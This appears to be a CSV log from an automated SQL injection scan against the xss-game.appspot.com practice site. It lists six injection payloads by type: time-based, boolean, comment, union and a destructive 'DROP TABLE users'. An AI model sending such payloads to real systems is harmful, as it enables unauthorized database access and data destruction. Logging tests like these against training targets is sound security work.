ID,Number,IP,Site,URL,Payload,Type,Status,Time
78,6,127.0.0.1,https://xss-game.appspot.com,/?id=1' SLEEP(5) --...,id=1' SLEEP(5) --,TIME-BASED,200,2025-12-24T15:06:25.796
77,5,127.0.0.1,https://xss-game.appspot.com,/?id=1 OR '1'='1...,id=1 OR '1'='1,🔴 BOOLEAN,200,2025-12-24T15:06:25.199
76,4,127.0.0.1,https://xss-game.appspot.com,/?admin' --...,admin' --,🟢 COMMENT,200,2025-12-24T15:06:24.535
75,3,127.0.0.1,https://xss-game.appspot.com,/?id=1; DROP TABLE users --...,id=1; DROP TABLE users --,DESTRUCTIVE,200,2025-12-24T15:06:23.746
74,2,127.0.0.1,https://xss-game.appspot.com,/?id=1 UNION SELECT 1,2,3 --...,id=1 UNION SELECT 1,2,3 --,🟡 UNION,200,2025-12-24T15:06:23.204
73,1,127.0.0.1,https://xss-game.appspot.com,/?id=1' OR 1=1 --...,id=1' OR 1=1 --,🔴 BOOLEAN,200,2025-12-24T15:06:22.359
